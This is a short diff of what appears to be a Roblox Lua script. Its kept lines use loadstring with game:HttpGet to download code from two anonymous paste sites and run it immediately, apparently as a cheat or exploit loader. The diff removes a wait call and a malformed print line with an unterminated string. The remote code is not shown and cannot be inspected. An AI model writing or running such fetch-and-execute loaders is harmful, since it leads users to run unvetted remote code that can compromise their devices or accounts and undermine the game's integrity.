@@ -1,4 +1,2 @@
 loadstring(game:HttpGet("https://paste.debian.net/plainh/c7713368/", true))()
-task.wait(0.3)
 loadstring(game:HttpGet('https://pastefy.app/X3jV29RY/raw'))()
-print("done)
